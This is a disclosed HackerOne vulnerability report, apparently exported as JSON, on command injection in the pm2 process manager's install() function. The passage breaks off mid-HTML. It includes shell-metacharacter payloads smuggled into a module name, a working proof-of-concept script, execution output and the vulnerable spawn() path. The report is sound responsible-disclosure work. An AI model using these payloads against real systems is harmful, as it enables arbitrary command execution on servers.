{"id":633364,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzMzNjQ=","url":"https://hackerone.com/reports/633364","title":"Command Injection in npm module name passed as an argument to pm2.install() function","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-07-02T00:16:39.830Z","submitted_at":"2019-07-02T00:16:39.830Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bl4de","url":"/bl4de","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-24T09:52:54.847Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-09-24T09:52:48.768Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Lads,\n\nI would like to report Command Injection possible when npm module name is passed into `pm2.install()`. An attacker is able to attach OS commands to npm module name and those commands will be executed when payload reaches execution sink in `continueInstall()` function in `API/Modules/NPM.js` file.\n\n# Module\n\n**module name:** pm2\n**version:** 3.5.1\n**npm page:** `https://www.npmjs.com/package/pm2`\n\n## Module Description\n\nPM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.\n\n## Module Stats\n\n**~320.000 downloads/week**\n**\u003e1.200.000 downloads/month**\n\n# Vulnerability\n\nnpm packages can be installed using `pm2 install [PACKAGE NAME]` command run from command line or as a call to `pm2.install(PACKAGE_NAME)` when `pm2` API is used in programmatic way. Both ways of execution are vulnerable.\n\nHere's an example of exploitation when `test` package is installed from command line with `pm2 install \"test;pwd;whoami;uname;\"` command:\n\n```\nbl4de:~/playground/Node $ ./pm2 install \"test;pwd;whoami;uname;\"\n[PM2][Module] Installing NPM test;pwd;whoami;uname; module\n[PM2][Module] Calling [NPM] to install test;pwd;whoami;uname; ...\nnpm WARN saveError ENOENT: no such file or directory, open '/Users/bl4de/package.json'\nnpm WARN enoent ENOENT: no such file or directory, open '/Users/bl4de/package.json'\nnpm WARN bl4de No description\nnpm WARN bl4de No repository field.\nnpm WARN bl4de No README data\nnpm WARN bl4de No license field.\n\n+ test@0.6.0\nupdated 1 package and audited 3 packages in 0.902s\nfound 0 vulnerabilities\n\n/Users/bl4de\nbl4de\nDarwin\n/bin/sh: --loglevel=error: command not found\n[PM2][ERROR] Installation failed via NPM, module has been restored to prev version\n┌──────────┬────┬─────────┬──────┬───────┬────────┬─────────┬────────┬──────┬───────────┬───────┬──────────┐\n│ App name │ id │ version │ mode │ pid   │ status │ restart │ uptime │ cpu  │ mem       │ user  │ watching │\n├──────────┼────┼─────────┼──────┼───────┼────────┼─────────┼────────┼──────┼───────────┼───────┼──────────┤\n│ app      │ 0  │ N/A     │ fork │ 86409 │ online │ 1220    │ 1s     │ 6.5% │ 31.9 MB   │ bl4de │ disabled │\n└──────────┴────┴─────────┴──────┴───────┴────────┴─────────┴────────┴──────┴───────────┴───────┴──────────┘\nModule\n┌────────┬────┬─────────┬───────┬────────┬─────────┬──────┬───────────┬───────┐\n│ Module │ id │ version │ pid   │ status │ restart │ cpu  │ memory    │ user  │\n├────────┼────┼─────────┼───────┼────────┼─────────┼──────┼───────────┼───────┤\n│ test   │ 1  │ 0.6.0   │ 86405 │ online │ 1216    │ 3.5% │ 32.3 MB   │ bl4de │\n└────────┴────┴─────────┴───────┴────────┴─────────┴──────┴───────────┴───────┘\n Use `pm2 show \u003cid|name\u003e` to get more details about an app\nbl4de:~/playground/Node $\n```\n\nAs you can see, there is an output from `pwd`, 'whoami` and `uname` commands injected as a part of npm module name.\n\n\nHere's sample PoC which exploits this vulnerability when `pm2` API is used in separate application:\n\n```javascript\n// pm2_exploit.js\n\n\n'use strict'\nconst pm2 = require('pm2')\n\n// payload - user controllable input\nconst payload = \"test;pwd;whoami;uname -a;ls -l ~/playground/Node;\"\n\npm2.connect(function (err) {\n    if (err) {\n        console.error(err)\n        process.exit(2)\n    }\n\n    pm2.start({\n        script: 'app.js' // fake app.js to supress \"No script path - aborting\" error thrown from PM2\n    }, (err, apps) =\u003e {\n        pm2.install(payload, {}) // injection\n        pm2.disconnect()\n        if (err) {\n            throw err\n        }\n    })\n})\n```\n\nAfter executing it with `node pm2_exploit.js` command, we get following output:\n\n```\nbl4de:~/playground/Node $ node pm2_exploit.js\nnpm WARN saveError ENOENT: no such file or directory, open '/Users/bl4de/package.json'\nnpm WARN enoent ENOENT: no such file or directory, open '/Users/bl4de/package.json'\nnpm WARN bl4de No description\nnpm WARN bl4de No repository field.\nnpm WARN bl4de No README data\nnpm WARN bl4de No license field.\n\n+ test@0.6.0\nupdated 1 package and audited 3 packages in 0.427s\nfound 0 vulnerabilities\n\n/Users/bl4de\nbl4de\nDarwin bl4des-MacBook-Pro.local 18.6.0 Darwin Kernel Version 18.6.0: Thu Apr 25 23:16:27 PDT 2019; root:xnu-4903.261.4~2/RELEASE_X86_64 x86_64\ntotal 224\n-rw-r--r--@   1 bl4de  staff      37 Jul  1 22:38 app.js\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  104809 Jul  2 00:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -\u003e ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     522 Jul  2 00:58 pm2_exploit.js\n/bin/sh: --loglevel=error: command not found\n```\n\nAgain, commands injected as a part of npm module were executed successfully.\n\n{F520355}\n\n\n## Vulnerability Description\n\nSimilar to `https://hackerone.com/reports/630227`, the exploitation chain starts in `lib/API/Modules/Modularizer.js` in `Modularizer.install()` function call (I've cut part of the code which is not relevant to the vulnerability):\n\n\n```javascript\n\n/**\n * PM2 Module System.\n */\nModularizer.install = function (CLI, module_name, opts, cb) {\n  if (typeof(opts) == 'function') {\n    cb = opts;\n    opts = {};\n  }\n\n    (...)\n\n  else {\n    Common.logMod(`Installing NPM ${module_name} module`);\n    NPM.install(CLI, module_name, opts, cb)   //// injection point\n  }\n};\n\n```\n\n{F520353}\n\nIn line marked with `//// injection point` comment, unsanitized `module_name` variable is passed into `NPM.install()` function in `lib/API/Modules/NPM.js` module. \n\nFrom here, our unsanitized payload continues his journey to execution sink, passed as second argument into `NPM.continueInstall()`:\n\n\n```javascript\nfunction install(CLI, module_name, opts, cb) {\n  moduleExistInLocalDB(CLI, module_name, function (exists) {\n    if (exists) {\n      Common.logMod('Module already installed. Updating.');\n\n      Rollback.backup(module_name);\n\n      return uninstall(CLI, module_name, function () {\n        return continueInstall(CLI, module_name, opts, cb);\n      });\n    }\n    return continueInstall(CLI, module_name, opts, cb);  //// injection point\n  })\n}\n```\n\nFinally, it reaches its destination. As `continueInstall()` is quite long, I've left only the part which is important for our PoC:\n\n```javascript\n\nfunction continueInstall(CLI, module_name, opts, cb) {\n  Common.printOut(cst.PREFIX_MSG_MOD + 'Calling ' + chalk.bold.red('[NPM]') + ' to install ' + module_name + ' ...');\n\n  var canonic_module_name = Utility.getCanonicModuleName(module_name);\n  var install_path = path.join(cst.DEFAULT_MODULE_PATH, canonic_module_name);\n\n  require('mkdirp')(install_path, function() {\n    process.chdir(os.homedir());\n\n    var install_instance = spawn(cst.IS_WINDOWS ? 'npm.cmd' : 'npm', ['install', module_name, '--loglevel=error', '--prefix', '\"'+install_path+'\"' ], {\n      stdio : 'inherit',\n      env: process.env,\n\t\t  shell : true\n    });\n\n(...)\n```\n\nAs you can see, `module_name` (after being parsed by `Utility.getCanonicModuleName()` and returned and assigned to `canonic_module_name`) is passed into `spawn()` call and executed as a part of spawned `npm install MODULE_NAME ----loglevel=error --prefix INSTALL_PATH` command.\n\n{F520354}\n\n\n## Steps To Reproduce:\n\n- install pm2 (`npm i pm2`) - I've installed it locally and made symlink to executable `pm2` in the same folder\n- run `pm2 start` to run and verify if `pm2` is installed correctly. You should see output similar to following:\n\n```\nbl4de:~/playground/Node $ ./pm2 start\n[PM2][ERROR] File ecosystem.config.js not found\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show \u003cid|name\u003e` to get more details about an app\nbl4de:~/playground/Node $\n```\n\n- save `pm2_exploit.js` provided in section above in the same folder and run it with `node pm2_exploit.js` command\n- verify that output contains results of execution of injected commands\n\n## Patch\n\n`module_name` should be sanitized before it reaches execution sink.s\n\n## Supporting Material/References:\n\nVulnerability was tested with following configuration:\n\n- macOS 10.14.5\n- Node 10.13.0\n- npm 6.9.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nCheers,\n\nbl4de\n\n## Impact\n\nAn attacker is able to execute arbitrary commands injecting them as a part of npm module to install with `pm2.install()` call","vulnerability_information_html":"\u003cp\u003eHi Lads,\u003c/p\u003e\n\n\u003cp\u003eI would like to report Command Injection possible when npm module name is passed into \u003ccode\u003epm2.install()\u003c/code\u003e. An attacker is able to attach OS commands to npm module name and those commands will be executed when payload reaches execution sink in \u003ccode\u003econtinueInstall()\u003c/code\u003e function in \u003ccode\u003eAPI/Modules/NPM.js\u003c/code\u003e file.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e pm2\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 3.5.1\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/pm2\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003ePM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003e~320.000 downloads/week\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e\u0026gt;1.200.000 downloads/month\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003cp\u003enpm packages can be installed using \u003ccode\u003epm2 install [PACKAGE NAME]\u003c/code\u003e command run from command line or as a call to \u003ccode\u003epm2.install(PACKAGE_NAME)\u003c/code\u003e when \u003ccode\u003epm2\u003c/code\u003e API is used in programmatic way. Both ways of execution are vulnerable.\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s an example of exploitation when \u003ccode\u003etest\u003c/code\u003e package is installed from command line with \u003ccode\u003epm2 install \u0026quot;test;pwd;whoami;uname;\u0026quot;\u003c/code\u003e command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebl4de:~/playground/Node $ ./pm2 install \u0026quot;test;pwd;whoami;uname;\u0026quot;\n[PM2][Module] Installing NPM test;pwd;whoami;uname; module\n[PM2][Module] Calling [NPM] to install test;pwd;whoami;uname; ...\nnpm WARN saveError ENOENT: no such file or directory, open \u0026#39;/Users/bl4de/package.json\u0026#39;\nnpm WARN enoent ENOENT: no such file or directory, open \u0026#39;/Users/bl4de/package.json\u0026#39;\nnpm WARN bl4de No description\nnpm WARN bl4de No repository field.\nnpm WARN bl4de No README data\nnpm WARN bl4de No license field.\n\n+ test@0.6.0\nupdated 1 package and audited 3 packages in 0.902s\nfound 0 vulnerabilities\n\n/Users/bl4de\nbl4de\nDarwin\n/bin/sh: --loglevel=error: command not found\n[PM2][ERROR] Installation failed via NPM, module has been restored to prev version\n┌──────────┬────┬─────────┬──────┬───────┬────────┬─────────┬────────┬──────┬───────────┬───────┬──────────┐\n│ App name │ id │ version │ mode │ pid   │ status │ restart │ uptime │ cpu  │ mem       │ user  │ watching │\n├──────────┼────┼─────────┼──────┼───────┼────────┼─────────┼────────┼──────┼───────────┼───────┼──────────┤\n│ app      │ 0  │ N/A     │ fork │ 86409 │ online │ 1220    │ 1s     │ 6.5% │ 31.9 MB   │ bl4de │ disabled │\n└──────────┴────┴─────────┴──────┴───────┴────────┴─────────┴────────┴──────┴───────────┴───────┴──────────┘\nModule\n┌────────┬────┬─────────┬───────┬────────┬─────────┬──────┬───────────┬───────┐\n│ Module │ id │ version │ pid   │ status │ restart │ cpu  │ memory    │ user  │\n├────────┼────┼─────────┼───────┼────────┼─────────┼──────┼───────────┼───────┤\n│ test   │ 1  │ 0.6.0   │ 86405 │ online │ 1216    │ 3.5% │ 32.3 MB   │ bl4de │\n└────────┴────┴─────────┴───────┴────────┴─────────┴──────┴───────────┴───────┘\n Use `pm2 show \u0026lt;id|name\u0026gt;` to get more details about an app\nbl4de:~/playground/Node $\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs you can see, there is an output from \u003ccode\u003epwd\u003c/code\u003e, \u0026#39;whoami\u003ccode\u003eand\u003c/code\u003euname` commands injected as a part of npm module name.\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s sample PoC which exploits this vulnerability when \u003ccode\u003epm2\u003c/code\u003e API is used in separate application:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// pm2_exploit.js\u003c/span\u003e\n\n\n\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euse strict\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003epm2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// payload - user controllable input\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etest;pwd;whoami;uname -a;ls -l ~/playground/Node;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n        \u003cspan class=\"na\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eapp.js\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// fake app.js to supress \u0026quot;No script path - aborting\u0026quot; error thrown from PM2\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eapps\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{})\u003c/span\u003e \u003cspan class=\"c1\"\u003e// injection\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edisconnect\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ethrow\u003c/span\u003e \u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter executing it with \u003ccode\u003enode pm2_exploit.js\u003c/code\u003e command, we get following output:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebl4de:~/playground/Node $ node pm2_exploit.js\nnpm WARN saveError ENOENT: no such file or directory, open \u0026#39;/Users/bl4de/package.json\u0026#39;\nnpm WARN enoent ENOENT: no such file or directory, open \u0026#39;/Users/bl4de/package.json\u0026#39;\nnpm WARN bl4de No description\nnpm WARN bl4de No repository field.\nnpm WARN bl4de No README data\nnpm WARN bl4de No license field.\n\n+ test@0.6.0\nupdated 1 package and audited 3 packages in 0.427s\nfound 0 vulnerabilities\n\n/Users/bl4de\nbl4de\nDarwin bl4des-MacBook-Pro.local 18.6.0 Darwin Kernel Version 18.6.0: Thu Apr 25 23:16:27 PDT 2019; root:xnu-4903.261.4~2/RELEASE_X86_64 x86_64\ntotal 224\n-rw-r--r--@   1 bl4de  staff      37 Jul  1 22:38 app.js\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  104809 Jul  2 00:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -\u0026gt; ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     522 Jul  2 00:58 pm2_exploit.js\n/bin/sh: --loglevel=error: command not found\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAgain, commands injected as a part of npm module were executed successfully.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/355/02664e2b65f66de5c6b11c2ce08f8e39c2320d2b/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063148Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026amp;X-Amz-Signature=f1a01ee7e6f6247b2b42a82dd0c6196d285c0043f54f65a59cecd939837f9a72\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/355/02664e2b65f66de5c6b11c2ce08f8e39c2320d2b/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063148Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026amp;X-Amz-Signature=f1a01ee7e6f6247b2b42a82dd0c6196d285c0043f54f65a59cecd939837f9a72\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eSimilar to \u003ccode\u003ehttps://hackerone.com/reports/630227\u003c/code\u003e, the exploitation chain starts in \u003ccode\u003elib/API/Modules/Modularizer.js\u003c/code\u003e in \u003ccode\u003eModularizer.install()\u003c/code\u003e function call (I\u0026#39;ve cut part of the code which is not relevant to the vulnerability):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\n\u003cspan class=\"cm\"\u003e/**\n * PM2 Module System.\n */\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eModularizer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan 